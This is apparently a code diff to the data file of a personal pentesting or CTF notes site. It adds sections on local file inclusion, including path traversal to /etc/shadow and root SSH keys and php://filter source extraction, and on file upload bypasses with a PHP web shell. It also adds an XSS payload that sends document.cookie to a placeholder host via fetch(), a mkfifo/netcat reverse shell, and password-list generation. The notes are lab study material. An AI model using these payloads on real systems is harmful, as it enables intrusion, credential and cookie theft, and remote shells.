@@ -219,7 +219,13 @@ first.last:
 first initial + last:   
 <span class="cmd">awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt</span>  
 first + last initial:   
-<span class="cmd">awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt</span>`,
+<span class="cmd">awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt</span>
+
+## Generating passwords for a user
+
+<span class="cmd">git clone </span><span class="cmd">[https://github.com/Mebus/cupp.git](https://github.com/Mebus/cupp.git)</span><span class="cmd"> && cd cupp</span>  
+<span class="cmd">./cupp -i</span>  
+Interactive mode, answer the questions`,
               },
               {
                 slug: "cleaning-wordlists",
@@ -248,7 +254,7 @@ cURL`,
             children: [
               {
                 slug: "gobuster",
-                title: "Gobuster",
+                title: "gobuster",
                 body: `## Some options:
 
 <span class="cmd">-t [no.of threads]</span>  
@@ -310,7 +316,7 @@ else: <span class="cmd">-u</span> can have the domain name directly, rather than
                 title: "ffuf",
                 body: `## Directory Enumeration
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]</span>
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]</span>
 
 | Flag | Description |  
 | --- | --- |  
@@ -339,11 +345,11 @@ Add FUZZ in the URL itself (escape <span class="cmd">&</span> with <span class="
 
 ## Subdomain Enumeration
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>  
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>  
 use ip address, sometimes the name wont work even after adding it to <span class="cmd">/etc/hosts</span>
 
 Filter by size of response:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>`,
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>`,
               },
               {
                 slug: "curl",
@@ -447,7 +453,7 @@ js compiler: [https://jsconsole.com/](https://jsconsole.com/)`,
 <span class="cmd">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -x html,txt,php, js -u http://[MACHINE_IP]</span>  
 <span class="cmd">gobuster dir -w /usr/share/wordlists/dirb/medium.txt -x php, txt, html, js -u http://[MACHINE_IP]</span>
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP] -e .html,.txt.,php,.js</span>
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP] -e .html,.txt.,php,.js</span>
 
 ## Subdomain Enumeration
 
@@ -457,11 +463,11 @@ gobuster:
 <span class="cmd">gobuster dns --domain [example.thm] -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span>
 
 ffuf:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://[MACHINE_IP]</span>  
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://[MACHINE_IP]</span>  
 <span class="cmd">use ip address, sometimes the name wont work even after adding it to /etc/hosts</span>
 
 Filter by size of response:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[MACHINE_IP]" -u http://[MACHINE_IP]</span>
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[MACHINE_IP]" -u http://[MACHINE_IP]</span>
 
 ## Virtual Host Enumeration
 
@@ -768,7 +774,7 @@ The **COLUMNS** table in the **INFORMATION_SCHEMA** Database contains informatio
 
 • First, find out no. columns and the datatype of it.  
 • Then find out the name of the table and columns.  
-**If 4 columns **are present and **you can **retrieve data **from 2 **columns, **then put null for the other columns**  
+**If 4 columns** are present and **you can** retrieve data **from 2** columns, **then put null for the other columns**  
 Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--</span>
 
 ## Retrieving multiple values in single column
@@ -854,6 +860,181 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open,close
                 ],
               },
               {
+                slug: "file-inclusion",
+                title: "File Inclusion",
+                body: `# Common Target Files
+
+Commonly targeted files on both and Windows systems.
+
+| Location | Description |  
+| --- | --- |  
+| /etc/passwd | Lists all registered users on the system. |  
+| /etc/shadow | Contains hashed passwords for the system's users. |  
+| /root/.ssh/id_rsa | The private  key for the root user (or any known valid user on the server). |  
+| /root/.bash_history | Contains the command history for the root user. |  
+| /etc/issue | Message or system identification printed before the login prompt. |  
+| /etc/profile | Controls system-wide default variables, such as export variables, file creation mask (umask), and terminal types. |  
+| /proc/version | Displays the version of the Linux kernel. |  
+| /var/log/dmessage | Contains global system messages, including messages logged during system startup. |  
+| /var/mail/root | Contains all emails for the root user. |  
+| /var/log/apache2/access.log | Logs all requests made to the Apache web server. |  
+| C:\\boot.ini | Contains boot options for Windows computers with  firmware. |
+
+# Local File Inclusion (LFI)
+
+**NOTE:** Encoded <span class="cmd">../</span> : <span class="cmd">%2e%2e%2f</span>
+
+## Path traversal
+
+Use relative paths: <span class="cmd">../</span> to go to the parent directory.  
+Usual default web root: <span class="cmd">/var/www/html</span>  so location of:  <span class="cmd">/etc/passwd</span> : <span class="cmd">../../../etc/passwd</span>  
+**NOTE:** Number of <span class="cmd">**../**</span> does NOT matter.  
+	<span class="cmd">**../**</span> in root folder (/) will still remain in root (/).
+
+## Appended Extensions
+
+Append <span class="cmd">**%00**</span> (Null Byte) at the end of file - Stops processing string after that point  
+<span class="cmd">../../../etc/passwd </span><span class="cmd">**%00**</span>
+
+## Bypass Path Filters
+
+If <span class="cmd">/etc/passwd</span> is blocked, append <span class="cmd">**/.**</span> or <span class="cmd">**/..**</span> to the end of the path.   
+Null byte <span class="cmd">**%00**</span> can also be used
+
+## Path Truncation
+
+• In <span class="cmd">/////////etc/passwd/.</span>  : Trailing <span class="cmd">/</span> and <span class="cmd">.</span> is removed by PHP. Also, multiple <span class="cmd">/</span> are disregarded (only in old version of PHP)  
+	Therefore the above is the same as <span class="cmd">/etc/passwd</span>  
+• Current directory shortcut <span class="cmd">./</span> also is disregarded, eg: <span class="cmd">/etc/./passwd</span>  
+• Sometimes string max length is 4096 in older versions of php so long strings will be truncated  
+	So create long ones that evaluate to correct path - appended extension also will be truncated  
+	But we have to start with non-existent directory  
+	Eg: <span class="cmd">?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times</span>  
+<span class="cmd">echo -n "[non_existing_directory]/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done</span>  
+• We can use multiple ../ like previously but exact length of string must be calculated - only .php must get truncated
+
+## Forced Directory Prefix
+
+If a directory is always required in the input:  
+Add it in the start and traverse out of it. One extra <span class="cmd">**../**</span> in the payload
+
+## Stripping
+
+## <span class="cmd">**../**</span>
+
+## from input
+
+Use <span class="cmd">**....//**</span> instead  
+When <span class="cmd">../</span> from each <span class="cmd">....//</span>, it leaves <span class="cmd">../</span>
+
+![Screenshot 1 in File Inclusion notes](/notes/file-inclusion/img1.png)
+
+# PHP Filters
+
+PHP applications may use PHP Wrappers which give access to I/O streams (stdin/stdout, file descriptors, memory streams) at application level.
+
+## Input Filters
+
+Access PHP filter wrapper via: <span class="cmd">php://filter/</span>
+
+### Key parameters of filters:
+
+• resource - the stream/file to apply filter on (required)  
+• read - specifies which filter to apply  
+Four filter types available: String, Conversion, Compression, Encryption Filters  
+NOTE: **convert.base64-encode** (Conversion Filter) is the one useful for LFI attacks
+
+### Fuzz for php files
+
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]/FUZZ.php</span>  
+Read discovered files' source, then scan them for further referenced PHP files - repeat until app source/logic is mapped
+
+## Standard PHP LFI
+
+Including a .php file through LFI normally executes it, so we get the rendered output (often empty, e.g. config.php just sets config, no HTML)  
+**NOTE:** To read source code instead of executing it, use the base64 filter - bypasses execution and gives us the raw encoded source
+
+## Extract source code
+
+• Read source of config.php using base64 filter:  
+<span class="cmd">php://filter/read=convert.base64-encode/resource=config</span>  
+Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=php://filter/read=convert.base64-encode/resource=config</span>  
+• NOTE: Leave resource file at the end without extension - .php gets auto-appended, making it config.php  
+• Decode the returned base64 string:  
+<span class="cmd">echo 'BASE64_STRING' | base64 -d</span>
+
+# PHP Wrappers`,
+              },
+              {
+                slug: "file-upload",
+                title: "File Upload",
+                body: `# File Upload Vulnerabilities
+
+Server headers in response: Burpsuite also helps in this by looking at the response sent by the server.
+
+### File can be overwritten?
+
+Inspect images and look for the file name in the \`src\` attribute
+
+### Simple Web Shell
+
+<span class="cmd"><?php       </span>  
+<span class="cmd">	echo system($_GET["cmd"]);</span>  
+<span class="cmd">?></span>
+
+• After uploading: find out **where it is stored**  
+• To test for **remote code execution**:  
+• At the end of the URL, add:
+
+<span class="cmd">?cmd=ls;[command2];[command3]</span>
+
+### Proper shell: Pentest Monkey reverse shell
+
+Source code: [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  
+Change the IP  
+Start netcat listener:  
+<span class="cmd">nc -lvnp 1234</span>
+
+## Client side filtering
+
+• Reload the page in burpsuite  
+• Right click on intercepted data:  
+	**Do Intercept > Response to this request**
+
+• Remove the script that checks for file types and then **forward** the response.
+
+Directly sending the file to the upload point:  
+<span class="cmd">curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site></span>
+
+## Server Side:  File Extensions
+
+**Php Extensions**:   
+<span class="cmd">.php3 .php4 .php5 .php7 .phps .php-s .pht .phar</span>
+
+• Test with a **valid** file, jpg or png. Eg: shell.jpg  
+• Test with file extension ****having valid part**** but with ****different extension****: shell.jpg.php
+
+## Server Side: Magic Numbers
+
+**Magic number of JPEG files: **
+
+<span class="cmd">FF D8 FF DB</span>
+
+• Add ****4 random character in the start**** of file.  
+• Open it in ****hexeditor**** and change the bits in the beginning to the above magic number.  
+• file filename   to check the file type.`,
+              },
+              {
+                slug: "xss",
+                title: "XSS",
+                body: `## Payloads
+
+### Extract cookies
+
+Start nc  
+<span class="cmd"><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script></span>`,
+              },
+              {
                 slug: "mern",
                 title: "MERN",
                 body: `## Exploiting MERN
@@ -934,75 +1115,6 @@ Then we can add more code to redirect to home page so that victim remains unawar
 <span class="cmd">  width="400"></span>  
 Token here is just <span class="cmd">admin</span> base64-encoded → trivially reversible,`,
               },
-              {
-                slug: "file-upload",
-                title: "File upload",
-                body: `# File Upload Vulnerabilities
-
-Server headers in response: Burpsuite also helps in this by looking at the response sent by the server.
-
-### File can be overwritten?
-
-Inspect images and look for the file name in the \`src\` attribute
-
-### Simple Web Shell
-
-<span class="cmd"><?php       </span>  
-<span class="cmd">	echo system($_GET["cmd"]);</span>  
-<span class="cmd">?></span>
-
-• After uploading: find out **where it is stored**  
-• To test for **remote code execution**:  
-• At the end of the URL, add:
-
-<span class="cmd">?cmd=ls;[command2];[command3]</span>
-
-### Proper shell: Pentest Monkey reverse shell
-
-Source code: [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  
-Change the IP  
-Start netcat listener:  
-<span class="cmd">nc -lvnp 1234</span>
-
-## Client side filtering
-
-• Reload the page in burpsuite  
-• Right click on intercepted data:  
-	**Do Intercept > Response to this request**
-
-• Remove the script that checks for file types and then **forward** the response.
-
-Directly sending the file to the upload point:  
-<span class="cmd">curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site></span>
-
-## Server Side:  File Extensions
-
-**Php Extensions**:   
-<span class="cmd">.php3 .php4 .php5 .php7 .phps .php-s .pht .phar</span>
-
-• Test with a **valid** file, jpg or png. Eg: shell.jpg  
-• Test with file extension ****having valid part**** but with ****different extension****: shell.jpg.php
-
-## Server Side: Magic Numbers
-
-**Magic number of JPEG files: **
-
-<span class="cmd">FF D8 FF DB</span>
-
-• Add ****4 random character in the start**** of file.  
-• Open it in ****hexeditor**** and change the bits in the beginning to the above magic number.  
-• file filename   to check the file type.`,
-              },
-              {
-                slug: "xss",
-                title: "XSS",
-                body: `## Payloads
-
-### Extract cookies
-
-Start nc  
-<span class="cmd"><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script></span>`,
-              },
             ],
           },
           {
@@ -1031,6 +1143,7 @@ Links:
 
 ## web shells
 
+<span class="cmd"><?php system($_REQUEST[0]); ?></span>  
 <span class="cmd"><?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [MACHINE_IP} 4444 >/tmp/f"); ?></span>
 
 ## linux shells
@@ -1040,7 +1153,16 @@ Links:
           {
             slug: "password-cracking",
             title: "Password Cracking",
-            body: `# Prefix of different hashes
+            body: `# Identifying hashes
+
+<span class="cmd">hashid -m [hash]</span>  
+<span class="cmd">-m</span> : gives hashcat mode.  
+<span class="cmd">-j</span> : gives john format name.
+
+<span class="cmd">nth -t [hash]</span>  
+<span class="cmd">ntf -f [file_of_hashes]</span>
+
+# Prefix of different hashes
 
 | Prefix | Algorithm |  
 | --- | --- |  
@@ -1050,16 +1172,7 @@ Links:
 | $2b$, $2y$, $2a$, $2x$ | bcrypt is a hash based on the Blowfish block cipher originally developed for OpenBSD but supported on a recent version of FreeBSD, NetBSD, Solaris 10 and newer, and several Linux distributions |  
 | 6 | sha512crypt is a hash based on SHA-2 with 512-bit output originally developed for GNU libc and commonly used on (older) Linux systems |  
 | $md5 | SunMD5 is a hash based on the MD5 algorithm originally developed for Solaris |  
-| 1 | md5crypt is a hash based on the MD5 algorithm originally developed for FreeBSD |
-
-# Identifying hashes
-
-<span class="cmd">hashid -m [hash]</span>  
-<span class="cmd">-m</span> : gives hashcat mode.  
-<span class="cmd">-j</span> : gives john format name.
-
-<span class="cmd">nth -t [hash]</span>  
-<span class="cmd">ntf -f [file_of_hashes]</span>`,
+| 1 | md5crypt is a hash based on the MD5 algorithm originally developed for FreeBSD |`,
             children: [
               {
                 slug: "hydra",
